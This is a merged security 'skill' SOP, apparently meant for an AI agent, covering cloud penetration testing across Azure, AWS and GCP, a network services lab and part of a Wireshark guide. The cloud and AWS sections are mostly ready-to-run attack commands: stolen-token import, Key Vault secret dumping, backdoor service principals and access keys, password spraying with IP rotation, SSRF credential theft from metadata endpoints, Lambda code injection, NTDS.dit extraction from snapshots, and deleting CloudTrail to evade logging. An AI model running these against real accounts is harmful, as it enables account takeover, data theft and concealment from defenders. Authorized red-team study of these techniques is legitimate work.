---
name: infrastructure-security
description: Comprehensive Power SOP for Infrastructure Security. Combined from multiple specialized skills.
---

# Infrastructure Security Master SOP



--- SECTION: CONTAINER-SECURITY ---


# Container Security

Docker and Kubernetes security, image scanning, and runtime protection.

## When to Use

Use this skill when working on security expert tasks related to container security.

## Key Concepts

1. **Best Practices**: Follow industry standards
2. **Implementation**: Step-by-step guidance
3. **Examples**: Real-world applications

## Guidelines

- Start with understanding requirements
- Apply proven patterns
- Test and validate results


--- SECTION: CLOUD-PENETRATION-TESTING ---


# Cloud Penetration Testing

## Purpose

Conduct comprehensive security assessments of cloud infrastructure across Microsoft Azure, Amazon Web Services (AWS), and Google Cloud Platform (GCP). This skill covers reconnaissance, authentication testing, resource enumeration, privilege escalation, data extraction, and persistence techniques for authorized cloud security engagements.

## Prerequisites

### Required Tools
```bash
# Azure tools
Install-Module -Name Az -AllowClobber -Force
Install-Module -Name MSOnline -Force
Install-Module -Name AzureAD -Force

# AWS CLI
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip && sudo ./aws/install

# GCP CLI
curl https://sdk.cloud.google.com | bash
gcloud init

# Additional tools
pip install scoutsuite pacu
```

### Required Knowledge
- Cloud architecture fundamentals
- Identity and Access Management (IAM)
- API authentication mechanisms
- DevOps and automation concepts

### Required Access
- Written authorization for testing
- Test credentials or access tokens
- Defined scope and rules of engagement

## Outputs and Deliverables

1. **Cloud Security Assessment Report** - Comprehensive findings and risk ratings
2. **Resource Inventory** - Enumerated services, storage, and compute instances
3. **Credential Findings** - Exposed secrets, keys, and misconfigurations
4. **Remediation Recommendations** - Hardening guidance per platform

## Core Workflow

### Phase 1: Reconnaissance

Gather initial information about target cloud presence:

```bash
# Azure: Get federation info
curl "https://login.microsoftonline.com/getuserrealm.srf?login=user@target.com&xml=1"

# Azure: Get Tenant ID
curl "https://login.microsoftonline.com/target.com/v2.0/.well-known/openid-configuration"

# Enumerate cloud resources by company name
python3 cloud_enum.py -k targetcompany

# Check IP against cloud providers
cat ips.txt | python3 ip2provider.py
```

### Phase 2: Azure Authentication

Authenticate to Azure environments:

```powershell
# Az PowerShell Module
Import-Module Az
Connect-AzAccount

# With credentials (may bypass MFA)
$credential = Get-Credential
Connect-AzAccount -Credential $credential

# Import stolen context
Import-AzContext -Profile 'C:\Temp\StolenToken.json'

# Export context for persistence
Save-AzContext -Path C:\Temp\AzureAccessToken.json

# MSOnline Module
Import-Module MSOnline
Connect-MsolService
```

### Phase 3: Azure Enumeration

Discover Azure resources and permissions:

```powershell
# List contexts and subscriptions
Get-AzContext -ListAvailable
Get-AzSubscription

# Current user role assignments
Get-AzRoleAssignment

# List resources
Get-AzResource
Get-AzResourceGroup

# Storage accounts
Get-AzStorageAccount

# Web applications
Get-AzWebApp

# SQL Servers and databases
Get-AzSQLServer
Get-AzSqlDatabase -ServerName $Server -ResourceGroupName $RG

# Virtual machines
Get-AzVM
$vm = Get-AzVM -Name "VMName"
$vm.OSProfile

# List all users
Get-MSolUser -All

# List all groups
Get-MSolGroup -All

# Global Admins
Get-MsolRole -RoleName "Company Administrator"
Get-MSolGroupMember -GroupObjectId $GUID

# Service Principals
Get-MsolServicePrincipal
```

### Phase 4: Azure Exploitation

Exploit Azure misconfigurations:

```powershell
# Search user attributes for passwords
$users = Get-MsolUser -All
foreach($user in $users){
    $props = @()
    $user | Get-Member | foreach-object{$props+=$_.Name}
    foreach($prop in $props){
        if($user.$prop -like "*password*"){
            Write-Output ("[*]" + $user.UserPrincipalName + "[" + $prop + "]" + " : " + $user.$prop)
        }
    }
}

# Execute commands on VMs
Invoke-AzVMRunCommand -ResourceGroupName $RG -VMName $VM -CommandId RunPowerShellScript -ScriptPath ./script.ps1

# Extract VM UserData
$vms = Get-AzVM
$vms.UserData

# Dump Key Vault secrets
az keyvault list --query '[].name' --output tsv
az keyvault set-policy --name <vault> --upn <user> --secret-permissions get list
az keyvault secret list --vault-name <vault> --query '[].id' --output tsv
az keyvault secret show --id <URI>
```

### Phase 5: Azure Persistence

Establish persistence in Azure:

```powershell
# Create backdoor service principal
$spn = New-AzAdServicePrincipal -DisplayName "WebService" -Role Owner
$BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($spn.Secret)
$UnsecureSecret = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)

# Add service principal to Global Admin
$sp = Get-MsolServicePrincipal -AppPrincipalId <AppID>
$role = Get-MsolRole -RoleName "Company Administrator"
Add-MsolRoleMember -RoleObjectId $role.ObjectId -RoleMemberType ServicePrincipal -RoleMemberObjectId $sp.ObjectId

# Login as service principal
$cred = Get-Credential  # AppID as username, secret as password
Connect-AzAccount -Credential $cred -Tenant "tenant-id" -ServicePrincipal

# Create new admin user via CLI
az ad user create --display-name <name> --password <pass> --user-principal-name <upn>
```

### Phase 6: AWS Authentication

Authenticate to AWS environments:

```bash
# Configure AWS CLI
aws configure
# Enter: Access Key ID, Secret Access Key, Region, Output format

# Use specific profile
aws configure --profile target

# Test credentials
aws sts get-caller-identity
```

### Phase 7: AWS Enumeration

Discover AWS resources:

```bash
# Account information
aws sts get-caller-identity
aws iam list-users
aws iam list-roles

# S3 Buckets
aws s3 ls
aws s3 ls s3://bucket-name/
aws s3 sync s3://bucket-name ./local-dir

# EC2 Instances
aws ec2 describe-instances

# RDS Databases
aws rds describe-db-instances --region us-east-1

# Lambda Functions
aws lambda list-functions --region us-east-1
aws lambda get-function --function-name <name>

# EKS Clusters
aws eks list-clusters --region us-east-1

# Networking
aws ec2 describe-subnets
aws ec2 describe-security-groups --group-ids <sg-id>
aws directconnect describe-connections
```

### Phase 8: AWS Exploitation

Exploit AWS misconfigurations:

```bash
# Check for public RDS snapshots
aws rds describe-db-snapshots --snapshot-type manual --query=DBSnapshots[*].DBSnapshotIdentifier
aws rds describe-db-snapshot-attributes --db-snapshot-identifier <id>
# AttributeValues = "all" means publicly accessible

# Extract Lambda environment variables (may contain secrets)
aws lambda get-function --function-name <name> | jq '.Configuration.Environment'

# Access metadata service (from compromised EC2)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# IMDSv2 access
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl http://169.254.169.254/latest/meta-data/profile -H "X-aws-ec2-metadata-token: $TOKEN"
```

### Phase 9: AWS Persistence

Establish persistence in AWS:

```bash
# List existing access keys
aws iam list-access-keys --user-name <username>

# Create backdoor access key
aws iam create-access-key --user-name <username>

# Get all EC2 public IPs
for region in $(cat regions.txt); do
    aws ec2 describe-instances --query=Reservations[].Instances[].PublicIpAddress --region $region | jq -r '.[]'
done
```

### Phase 10: GCP Enumeration

Discover GCP resources:

```bash
# Authentication
gcloud auth login
gcloud auth activate-service-account --key-file creds.json
gcloud auth list

# Account information
gcloud config list
gcloud organizations list
gcloud projects list

# IAM Policies
gcloud organizations get-iam-policy <org-id>
gcloud projects get-iam-policy <project-id>

# Enabled services
gcloud services list

# Source code repos
gcloud source repos list
gcloud source repos clone <repo>

# Compute instances
gcloud compute instances list
gcloud beta compute ssh --zone "region" "instance" --project "project"

# Storage buckets
gsutil ls
gsutil ls -r gs://bucket-name
gsutil cp gs://bucket/file ./local

# SQL instances
gcloud sql instances list
gcloud sql databases list --instance <id>

# Kubernetes
gcloud container clusters list
gcloud container clusters get-credentials <cluster> --region <region>
kubectl cluster-info
```

### Phase 11: GCP Exploitation

Exploit GCP misconfigurations:

```bash
# Get metadata service data
curl "http://metadata.google.internal/computeMetadata/v1/?recursive=true&alt=text" -H "Metadata-Flavor: Google"

# Check access scopes
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes -H 'Metadata-Flavor:Google'

# Decrypt data with keyring
gcloud kms decrypt --ciphertext-file=encrypted.enc --plaintext-file=out.txt --key <key> --keyring <keyring> --location global

# Serverless function analysis
gcloud functions list
gcloud functions describe <name>
gcloud functions logs read <name> --limit 100

# Find stored credentials
sudo find /home -name "credentials.db"
sudo cp -r /home/user/.config/gcloud ~/.config
gcloud auth list
```

## Quick Reference

### Azure Key Commands

| Action | Command |
|--------|---------|
| Login | `Connect-AzAccount` |
| List subscriptions | `Get-AzSubscription` |
| List users | `Get-MsolUser -All` |
| List groups | `Get-MsolGroup -All` |
| Current roles | `Get-AzRoleAssignment` |
| List VMs | `Get-AzVM` |
| List storage | `Get-AzStorageAccount` |
| Key Vault secrets | `az keyvault secret list --vault-name <name>` |

### AWS Key Commands

| Action | Command |
|--------|---------|
| Configure | `aws configure` |
| Caller identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List S3 buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Metadata | `curl http://169.254.169.254/latest/meta-data/` |

### GCP Key Commands

| Action | Command |
|--------|---------|
| Login | `gcloud auth login` |
| List projects | `gcloud projects list` |
| List instances | `gcloud compute instances list` |
| List buckets | `gsutil ls` |
| List clusters | `gcloud container clusters list` |
| IAM policy | `gcloud projects get-iam-policy <project>` |
| Metadata | `curl -H "Metadata-Flavor: Google" http://metadata.google.internal/...` |

### Metadata Service URLs

| Provider | URL |
|----------|-----|
| AWS | `http://169.254.169.254/latest/meta-data/` |
| Azure | `http://169.254.169.254/metadata/instance?api-version=2018-02-01` |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` |

### Useful Tools

| Tool | Purpose |
|------|---------|
| ScoutSuite | Multi-cloud security auditing |
| Pacu | AWS exploitation framework |
| AzureHound | Azure AD attack path mapping |
| ROADTools | Azure AD enumeration |
| WeirdAAL | AWS service enumeration |
| MicroBurst | Azure security assessment |
| PowerZure | Azure post-exploitation |

## Constraints and Limitations

### Legal Requirements
- Only test with explicit written authorization
- Respect scope boundaries between cloud accounts
- Do not access production customer data
- Document all testing activities

### Technical Limitations
- MFA may prevent credential-based attacks
- Conditional Access policies may restrict access
- CloudTrail/Activity Logs record all API calls
- Some resources require specific regional access

### Detection Considerations
- Cloud providers log all API activity
- Unusual access patterns trigger alerts
- Use slow, deliberate enumeration
- Consider GuardDuty, Security Center, Cloud Armor

## Examples

### Example 1: Azure Password Spray

**Scenario:** Test Azure AD password policy

```powershell
# Using MSOLSpray with FireProx for IP rotation
# First create FireProx endpoint
python fire.py --access_key <key> --secret_access_key <secret> --region us-east-1 --url https://login.microsoft.com --command create

# Spray passwords
Import-Module .\MSOLSpray.ps1
Invoke-MSOLSpray -UserList .\users.txt -Password "Spring2024!" -URL https://<api-gateway>.execute-api.us-east-1.amazonaws.com/fireprox
```

### Example 2: AWS S3 Bucket Enumeration

**Scenario:** Find and access misconfigured S3 buckets

```bash
# List all buckets
aws s3 ls | awk '{print $3}' > buckets.txt

# Check each bucket for contents
while read bucket; do
    echo "Checking: $bucket"
    aws s3 ls s3://$bucket 2>/dev/null
done < buckets.txt

# Download interesting bucket
aws s3 sync s3://misconfigured-bucket ./loot/
```

### Example 3: GCP Service Account Compromise

**Scenario:** Pivot using compromised service account

```bash
# Authenticate with service account key
gcloud auth activate-service-account --key-file compromised-sa.json

# List accessible projects
gcloud projects list

# Enumerate compute instances
gcloud compute instances list --project target-project

# Check for SSH keys in metadata
gcloud compute project-info describe --project target-project | grep ssh

# SSH to instance
gcloud beta compute ssh instance-name --zone us-central1-a --project target-project
```

## Troubleshooting

| Issue | Solutions |
|-------|-----------|
| Authentication failures | Verify credentials; check MFA; ensure correct tenant/project; try alternative auth methods |
| Permission denied | List current roles; try different resources; check resource policies; verify region |
| Metadata service blocked | Check IMDSv2 (AWS); verify instance role; check firewall for 169.254.169.254 |
| Rate limiting | Add delays; spread across regions; use multiple credentials; focus on high-value targets |

## References

- [Advanced Cloud Scripts](references/advanced-cloud-scripts.md) - Azure Automation runbooks, Function Apps enumeration, AWS data exfiltration, GCP advanced exploitation


--- SECTION: AWS-PENETRATION-TESTING ---


# AWS Penetration Testing

## Purpose

Provide comprehensive techniques for penetration testing AWS cloud environments. Covers IAM enumeration, privilege escalation, SSRF to metadata endpoint, S3 bucket exploitation, Lambda code extraction, and persistence techniques for red team operations.

## Inputs/Prerequisites

- AWS CLI configured with credentials
- Valid AWS credentials (even low-privilege)
- Understanding of AWS IAM model
- Python 3, boto3 library
- Tools: Pacu, Prowler, ScoutSuite, SkyArk

## Outputs/Deliverables

- IAM privilege escalation paths
- Extracted credentials and secrets
- Compromised EC2/Lambda/S3 resources
- Persistence mechanisms
- Security audit findings

---

## Essential Tools

| Tool | Purpose | Installation |
|------|---------|--------------|
| Pacu | AWS exploitation framework | `git clone https://github.com/RhinoSecurityLabs/pacu` |
| SkyArk | Shadow Admin discovery | `Import-Module .\SkyArk.ps1` |
| Prowler | Security auditing | `pip install prowler` |
| ScoutSuite | Multi-cloud auditing | `pip install scoutsuite` |
| enumerate-iam | Permission enumeration | `git clone https://github.com/andresriancho/enumerate-iam` |
| Principal Mapper | IAM analysis | `pip install principalmapper` |

---

## Core Workflow

### Step 1: Initial Enumeration

Identify the compromised identity and permissions:

```bash
# Check current identity
aws sts get-caller-identity

# Configure profile
aws configure --profile compromised

# List access keys
aws iam list-access-keys

# Enumerate permissions
./enumerate-iam.py --access-key AKIA... --secret-key StF0q...
```

### Step 2: IAM Enumeration

```bash
# List all users
aws iam list-users

# List groups for user
aws iam list-groups-for-user --user-name TARGET_USER

# List attached policies
aws iam list-attached-user-policies --user-name TARGET_USER

# List inline policies
aws iam list-user-policies --user-name TARGET_USER

# Get policy details
aws iam get-policy --policy-arn POLICY_ARN
aws iam get-policy-version --policy-arn POLICY_ARN --version-id v1

# List roles
aws iam list-roles
aws iam list-attached-role-policies --role-name ROLE_NAME
```

### Step 3: Metadata SSRF (EC2)

Exploit SSRF to access metadata endpoint (IMDSv1):

```bash
# Access metadata endpoint
http://169.254.169.254/latest/meta-data/

# Get IAM role name
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Extract temporary credentials
http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME

# Response contains:
{
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "...",
  "Token": "...",
  "Expiration": "2019-08-01T05:20:30Z"
}
```

**For IMDSv2 (token required):**

```bash
# Get token first
TOKEN=$(curl -X PUT -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" \
  "http://169.254.169.254/latest/api/token")

# Use token for requests
curl -H "X-aws-ec2-metadata-token:$TOKEN" \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

**Fargate Container Credentials:**

```bash
# Read environment for credential path
/proc/self/environ
# Look for: AWS_CONTAINER_CREDENTIALS_RELATIVE_URI=/v2/credentials/...

# Access credentials
http://169.254.170.2/v2/credentials/CREDENTIAL-PATH
```

---

## Privilege Escalation Techniques

### Shadow Admin Permissions

These permissions are equivalent to administrator:

| Permission | Exploitation |
|------------|--------------|
| `iam:CreateAccessKey` | Create keys for admin user |
| `iam:CreateLoginProfile` | Set password for any user |
| `iam:AttachUserPolicy` | Attach admin policy to self |
| `iam:PutUserPolicy` | Add inline admin policy |
| `iam:AddUserToGroup` | Add self to admin group |
| `iam:PassRole` + `ec2:RunInstances` | Launch EC2 with admin role |
| `lambda:UpdateFunctionCode` | Inject code into Lambda |

### Create Access Key for Another User

```bash
aws iam create-access-key --user-name target_user
```

### Attach Admin Policy

```bash
aws iam attach-user-policy --user-name my_username \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### Add Inline Admin Policy

```bash
aws iam put-user-policy --user-name my_username \
  --policy-name admin_policy \
  --policy-document file://admin-policy.json
```

### Lambda Privilege Escalation

```python
# code.py - Inject into Lambda function
import boto3

def lambda_handler(event, context):
    client = boto3.client('iam')
    response = client.attach_user_policy(
        UserName='my_username',
        PolicyArn="arn:aws:iam::aws:policy/AdministratorAccess"
    )
    return response
```

```bash
# Update Lambda code
aws lambda update-function-code --function-name target_function \
  --zip-file fileb://malicious.zip
```

---

## S3 Bucket Exploitation

### Bucket Discovery

```bash
# Using bucket_finder
./bucket_finder.rb wordlist.txt
./bucket_finder.rb --download --region us-east-1 wordlist.txt

# Common bucket URL patterns
https://{bucket-name}.s3.amazonaws.com
https://s3.amazonaws.com/{bucket-name}
```

### Bucket Enumeration

```bash
# List buckets (with creds)
aws s3 ls

# List bucket contents
aws s3 ls s3://bucket-name --recursive

# Download all files
aws s3 sync s3://bucket-name ./local-folder
```

### Public Bucket Search

```
https://buckets.grayhatwarfare.com/
```

---

## Lambda Exploitation

```bash
# List Lambda functions
aws lambda list-functions

# Get function code
aws lambda get-function --function-name FUNCTION_NAME
# Download URL provided in response

# Invoke function
aws lambda invoke --function-name FUNCTION_NAME output.txt
```

---

## SSM Command Execution

Systems Manager allows command execution on EC2 instances:

```bash
# List managed instances
aws ssm describe-instance-information

# Execute command
aws ssm send-command --instance-ids "i-0123456789" \
  --document-name "AWS-RunShellScript" \
  --parameters commands="whoami"

# Get command output
aws ssm list-command-invocations --command-id "CMD-ID" \
  --details --query "CommandInvocations[].CommandPlugins[].Output"
```

---

## EC2 Exploitation

### Mount EBS Volume

```bash
# Create snapshot of target volume
aws ec2 create-snapshot --volume-id vol-xxx --description "Audit"

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to attacker instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf

# Mount and access
sudo mkdir /mnt/stolen
sudo mount /dev/xvdf1 /mnt/stolen
```

### Shadow Copy Attack (Windows DC)

```bash
# CloudCopy technique
# 1. Create snapshot of DC volume
# 2. Share snapshot with attacker account
# 3. Mount in attacker instance
# 4. Extract NTDS.dit and SYSTEM
secretsdump.py -system ./SYSTEM -ntds ./ntds.dit local
```

---

## Console Access from API Keys

Convert CLI credentials to console access:

```bash
git clone https://github.com/NetSPI/aws_consoler
aws_consoler -v -a AKIAXXXXXXXX -s SECRETKEY

# Generates signin URL for console access
```

---

## Covering Tracks

### Disable CloudTrail

```bash
# Delete trail
aws cloudtrail delete-trail --name trail_name

# Disable global events
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events

# Disable specific region
aws cloudtrail update-trail --name trail_name \
  --no-include-global-service-events --no-is-multi-region-trail
```

**Note:** Kali/Parrot/Pentoo Linux triggers GuardDuty alerts based on user-agent. Use Pacu which modifies the user-agent.

---

## Quick Reference

| Task | Command |
|------|---------|
| Get identity | `aws sts get-caller-identity` |
| List users | `aws iam list-users` |
| List roles | `aws iam list-roles` |
| List buckets | `aws s3 ls` |
| List EC2 | `aws ec2 describe-instances` |
| List Lambda | `aws lambda list-functions` |
| Get metadata | `curl http://169.254.169.254/latest/meta-data/` |

---

## Constraints

**Must:**
- Obtain written authorization before testing
- Document all actions for audit trail
- Test in scope resources only

**Must Not:**
- Modify production data without approval
- Leave persistent backdoors without documentation
- Disable security controls permanently

**Should:**
- Check for IMDSv2 before attempting metadata attacks
- Enumerate thoroughly before exploitation
- Clean up test resources after engagement

---

## Examples

### Example 1: SSRF to Admin

```bash
# 1. Find SSRF vulnerability in web app
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 2. Get role name from response
# 3. Extract credentials
https://app.com/proxy?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole

# 4. Configure AWS CLI with stolen creds
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 5. Verify access
aws sts get-caller-identity
```

---

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Access Denied on all commands | Enumerate permissions with enumerate-iam |
| Metadata endpoint blocked | Check for IMDSv2, try container metadata |
| GuardDuty alerts | Use Pacu with custom user-agent |
| Expired credentials | Re-fetch from metadata (temp creds rotate) |
| CloudTrail logging actions | Consider disable or log obfuscation |

---

## Additional Resources

For advanced techniques including Lambda/API Gateway exploitation, Secrets Manager & KMS, Container security (ECS/EKS/ECR), RDS/DynamoDB exploitation, VPC lateral movement, and security checklists, see [references/advanced-aws-pentesting.md](references/advanced-aws-pentesting.md).


--- SECTION: NETWORK-101 ---


# Network 101

## Purpose

Configure and test common network services (HTTP, HTTPS, SNMP, SMB) for penetration testing lab environments. Enable hands-on practice with service enumeration, log analysis, and security testing against properly configured target systems.

## Inputs/Prerequisites

- Windows Server or Linux system for hosting services
- Kali Linux or similar for testing
- Administrative access to target system
- Basic networking knowledge (IP addressing, ports)
- Firewall access for port configuration

## Outputs/Deliverables

- Configured HTTP/HTTPS web server
- SNMP service with accessible communities
- SMB file shares with various permission levels
- Captured logs for analysis
- Documented enumeration results

## Core Workflow

### 1. Configure HTTP Server (Port 80)

Set up a basic HTTP web server for testing:

**Windows IIS Setup:**
1. Open IIS Manager (Internet Information Services)
2. Right-click Sites → Add Website
3. Configure site name and physical path
4. Bind to IP address and port 80

**Linux Apache Setup:**

```bash
# Install Apache
sudo apt update && sudo apt install apache2

# Start service
sudo systemctl start apache2
sudo systemctl enable apache2

# Create test page
echo "<html><body><h1>Test Page</h1></body></html>" | sudo tee /var/www/html/index.html

# Verify service
curl http://localhost
```

**Configure Firewall for HTTP:**

```bash
# Linux (UFW)
sudo ufw allow 80/tcp

# Windows PowerShell
New-NetFirewallRule -DisplayName "HTTP" -Direction Inbound -Protocol TCP -LocalPort 80 -Action Allow
```

### 2. Configure HTTPS Server (Port 443)

Set up secure HTTPS with SSL/TLS:

**Generate Self-Signed Certificate:**

```bash
# Linux - Generate certificate
sudo openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /etc/ssl/private/apache-selfsigned.key \
  -out /etc/ssl/certs/apache-selfsigned.crt

# Enable SSL module
sudo a2enmod ssl
sudo systemctl restart apache2
```

**Configure Apache for HTTPS:**

```bash
# Edit SSL virtual host
sudo nano /etc/apache2/sites-available/default-ssl.conf

# Enable site
sudo a2ensite default-ssl
sudo systemctl reload apache2
```

**Verify HTTPS Setup:**

```bash
# Check port 443 is open
nmap -p 443 192.168.1.1

# Test SSL connection
openssl s_client -connect 192.168.1.1:443

# Check certificate
curl -kv https://192.168.1.1
```

### 3. Configure SNMP Service (Port 161)

Set up SNMP for enumeration practice:

**Linux SNMP Setup:**

```bash
# Install SNMP daemon
sudo apt install snmpd snmp

# Configure community strings
sudo nano /etc/snmp/snmpd.conf

# Add these lines:
# rocommunity public
# rwcommunity private

# Restart service
sudo systemctl restart snmpd
```

**Windows SNMP Setup:**
1. Open Server Manager → Add Features
2. Select SNMP Service
3. Configure community strings in Services → SNMP Service → Properties

**SNMP Enumeration Commands:**

```bash
# Basic SNMP walk
snmpwalk -c public -v1 192.168.1.1

# Enumerate system info
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.1

# Get running processes
snmpwalk -c public -v1 192.168.1.1 1.3.6.1.2.1.25.4.2.1.2

# SNMP check tool
snmp-check 192.168.1.1 -c public

# Brute force community strings
onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 192.168.1.1
```

### 4. Configure SMB Service (Port 445)

Set up SMB file shares for enumeration:

**Windows SMB Share:**
1. Create folder to share
2. Right-click → Properties → Sharing → Advanced Sharing
3. Enable sharing and set permissions
4. Configure NTFS permissions

**Linux Samba Setup:**

```bash
# Install Samba
sudo apt install samba

# Create share directory
sudo mkdir -p /srv/samba/share
sudo chmod 777 /srv/samba/share

# Configure Samba
sudo nano /etc/samba/smb.conf

# Add share:
# [public]
#    path = /srv/samba/share
#    browsable = yes
#    guest ok = yes
#    read only = no

# Restart service
sudo systemctl restart smbd
```

**SMB Enumeration Commands:**

```bash
# List shares anonymously
smbclient -L //192.168.1.1 -N

# Connect to share
smbclient //192.168.1.1/share -N

# Enumerate with smbmap
smbmap -H 192.168.1.1

# Full enumeration
enum4linux -a 192.168.1.1

# Check for vulnerabilities
nmap --script smb-vuln* 192.168.1.1
```

### 5. Analyze Service Logs

Review logs for security analysis:

**HTTP/HTTPS Logs:**

```bash
# Apache access log
sudo tail -f /var/log/apache2/access.log

# Apache error log
sudo tail -f /var/log/apache2/error.log

# Windows IIS logs
# Location: C:\inetpub\logs\LogFiles\W3SVC1\
```

**Parse Log for Credentials:**

```bash
# Search for POST requests
grep "POST" /var/log/apache2/access.log

# Extract user agents
awk '{print $12}' /var/log/apache2/access.log | sort | uniq -c
```

## Quick Reference

### Essential Ports

| Service | Port | Protocol |
|---------|------|----------|
| HTTP | 80 | TCP |
| HTTPS | 443 | TCP |
| SNMP | 161 | UDP |
| SMB | 445 | TCP |
| NetBIOS | 137-139 | TCP/UDP |

### Service Verification Commands

```bash
# Check HTTP
curl -I http://target

# Check HTTPS
curl -kI https://target

# Check SNMP
snmpwalk -c public -v1 target

# Check SMB
smbclient -L //target -N
```

### Common Enumeration Tools

| Tool | Purpose |
|------|---------|
| nmap | Port scanning and scripts |
| nikto | Web vulnerability scanning |
| snmpwalk | SNMP enumeration |
| enum4linux | SMB/NetBIOS enumeration |
| smbclient | SMB connection |
| gobuster | Directory brute forcing |

## Constraints

- Self-signed certificates trigger browser warnings
- SNMP v1/v2c communities transmit in cleartext
- Anonymous SMB access is often disabled by default
- Firewall rules must allow inbound connections
- Lab environments should be isolated from production

## Examples

### Example 1: Complete HTTP Lab Setup

```bash
# Install and configure
sudo apt install apache2
sudo systemctl start apache2

# Create login page
cat << 'EOF' | sudo tee /var/www/html/login.html
<html>
<body>
<form method="POST" action="login.php">
Username: <input type="text" name="user"><br>
Password: <input type="password" name="pass"><br>
<input type="submit" value="Login">
</form>
</body>
</html>
EOF

# Allow through firewall
sudo ufw allow 80/tcp
```

### Example 2: SNMP Testing Setup

```bash
# Quick SNMP configuration
sudo apt install snmpd
echo "rocommunity public" | sudo tee -a /etc/snmp/snmpd.conf
sudo systemctl restart snmpd

# Test enumeration
snmpwalk -c public -v1 localhost
```

### Example 3: SMB Anonymous Access

```bash
# Configure anonymous share
sudo apt install samba
sudo mkdir /srv/samba/anonymous
sudo chmod 777 /srv/samba/anonymous

# Test access
smbclient //localhost/anonymous -N
```

## Troubleshooting

| Issue | Solution |
|-------|----------|
| Port not accessible | Check firewall rules (ufw, iptables, Windows Firewall) |
| Service not starting | Check logs with `journalctl -u service-name` |
| SNMP timeout | Verify UDP 161 is open, check community string |
| SMB access denied | Verify share permissions and user credentials |
| HTTPS certificate error | Accept self-signed cert or add to trusted store |
| Cannot connect remotely | Bind service to 0.0.0.0 instead of localhost |


--- SECTION: WIRESHARK-ANALYSIS ---


# Wireshark Network Traffic Analysis

## Purpose

Execute comprehensive network traffic analysis using Wireshark to capture, filter, and examine network packets for security investigations, performance optimization, and troubleshooting. This skill enables systematic analysis of network protocols, detection of anomalies, and reconstruction of network conversations from PCAP files.

## Inputs / Prerequisites

### Required Tools
- Wireshark installed (Windows, macOS, or Linux)
- Network interface with capture permissions
- PCAP/PCAPNG files for offline analysis
- Administrator/root privileges for live capture

### Technical Requirements
- Understanding of network protocols (TCP, UDP, HTTP, DNS)
- Familiarity with IP addressing and ports
- Knowledge of OSI model layers
- Understanding of common attack patterns

### Use Cases
- Network troubleshooting and connectivity issues
- Security incident investigation
- Malware traffic analysis
- Performance monitoring and optimization
- Protocol learning and education

## Outputs / Deliverables

### Primary Outputs
- Filtered packet captures for specific traffic
- Reconstructed communication streams
- Traffic statistics and visualizations
- Evidence documentation for incidents

## Core Workflow

### Phase 1: Capturing Network Traffic

#### Start Live Capture
Begin capturing packets on network interface:

```
1. Launch Wireshark
2. Select network interface from main screen
3. Click shark fin icon or double-click interface
4. Capture begins immediately
```

#### Capture Controls
| Action | Shortcut | Description |
|--------|----------|-------------|
| Start/Stop Capture | Ctrl+E | Toggle capture on/off |
| Restart Capture | Ctrl+R | Stop and start new capture |
| Open PCAP File | Ctrl+O | Load existing capture file |
| Save Capture | Ctrl+S | Save current capture |

#### Capture Filters
Apply filters before capture to limit data collection:

```
# Capture only specific host
host 192.168.1.100

# Capture specific port
port 80

# Capture specific network
net 192.168.1.0/24

# Exclude specific traffic
not arp

# Combine filters
host 192.168.1.100 and port 443
```

### Phase 2: Display Filters

#### Basic Filter Syntax
Filter captured packets for analysis:

```
# IP address filters
ip.addr == 192.168.1.1              # All traffic to/from IP
ip.src == 192.168.1.1               # Source IP only
ip.dst == 192.168.1.1               # Destination IP only

# Port filters
tcp.port == 80                       # TCP port 80
udp.port == 53                       # UDP port 53
tcp.dstport == 443                   # Destination port 443
tcp.srcport == 22                    # Source port 22
```

#### Protocol Filters
Filter by specific protocols:

```
# Common protocols
http                                  # HTTP traffic
https or ssl or tls                   # Encrypted web traffic
dns                                   # DNS queries and responses
ftp                                   # FTP traffic
ssh                                   # SSH traffic
icmp                                  # Ping/ICMP traffic
arp                                   # ARP requests/responses
dhcp                                  # DHCP traffic
smb or smb2                          # SMB file sharing
```

#### TCP Flag Filters
Identify specific connection states:

```
tcp.flags.syn == 1                   # SYN packets (connection attempts)
tcp.flags.ack == 1                   # ACK packets
tcp.flags.fin == 1                   # FIN packets (connection close)
tcp.flags.reset == 1                 # RST packets (connection reset)
tcp.flags.syn == 1 && tcp.flags.ack == 0  # SYN-only (initial connection)
```

#### Content Filters
Search for specific content:

```
frame contains "password"            # Packets containing string
http.request.uri contains "login"    # HTTP URIs with string
tcp contains "GET"                   # TCP packets with string
```

#### Analysis Filters
Identify potential issues:

```
tcp.analysis.retransmission          # TCP retransmissions
tcp.analysis.duplicate_ack           # Duplicate ACKs
tcp.analysis.zero_window             # Zero window (flow control)
tcp.analysis.flags                   # Packets with issues
dns.flags.rcode != 0                 # DNS errors
```

#### Combining Filters
Use logical operators for complex queries:

```
# AND operator
